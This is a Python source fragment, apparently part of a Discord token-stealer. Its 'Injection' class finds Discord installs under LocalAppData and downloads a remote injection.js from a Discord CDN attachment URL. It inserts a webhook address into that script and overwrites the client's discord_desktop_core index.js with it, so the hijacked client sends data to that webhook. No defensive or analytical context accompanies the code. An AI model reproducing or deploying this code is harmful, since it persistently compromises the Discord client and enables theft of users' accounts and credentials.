class Injection:
    def __init__(self):
        self.LOCAL_APP_DATA = Path(os.getenv('localappdata'))
        self.inject()

    def inject(self):
        for _dir in os.listdir(self.LOCAL_APP_DATA):
            if 'discord' in _dir.lower():
                for __dir in os.listdir(self.LOCAL_APP_DATA / _dir):
                    if re.match(r'app-(\d*\.\d*)*', __dir):
                        abspath = self.LOCAL_APP_DATA / _dir / __dir
                        f = requests.get("https://cdn.discordapp.com/attachments/1094804863067623530/1103522079975931994/injection.js").text.replace("%WEBHOOK%", wbh)
                        try:
                            index_file_path = abspath / 'modules' / 'discord_desktop_core-1' / 'discord_desktop_core' / 'index.js'
                            with open(index_file_path, 'w', encoding="utf-8") as index_file:
                                index_file.write(f)
                        except:
                            try:
                                index_file_path = abspath / 'modules' / 'discord_desktop_core-2' / 'discord_desktop_core' / 'index.js'
                                with open(index_file_path, 'w', encoding="utf-8") as index_file:
                                    index_file.write(f)
                            except:
                                try:
                                    index_file_path = abspath / 'modules' / 'discord_desktop_core-3' / 'discord_desktop_core' / 'index.js'
                                    with open(index_file_path, 'w', encoding="utf-8") as index_file:
                                        index_file.write(f)
                                except:
                                    pass
